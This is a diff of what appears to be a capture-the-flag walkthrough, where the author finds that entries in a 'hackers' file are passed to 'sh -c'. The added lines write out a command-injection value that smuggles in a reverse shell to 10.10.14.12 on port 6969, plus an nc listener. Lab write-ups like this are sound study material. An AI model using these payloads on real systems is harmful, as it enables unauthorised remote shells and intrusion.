@@ -470,10 +470,13 @@ done
 
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 ```
-Running it, I get an error.
+Testing things here and there, I understood that only the third element onwards from the `hackers` file would be executed as a variable.
+
+`sh -c` is also a executing command, and in this case it would be executed by user `pwn`. I intend to exploit this by spawning a reverse shell.
 ```
-hippoeug@kali:~$ ./test.sh
-hippoeug@kali:~$ Failed to open normal output file recon/hello.nmap for writing
-QUITTING!
+echo "ignore ignore ';sh -i >& /dev/udp/10.10.14.12/6969 0>&1'" >> hackers
+
+hippoeug@kali:~$ nc -lvnp 6969
+listening on [any] 6969 ...
 ```
-What exactly is in the recon directory?
+
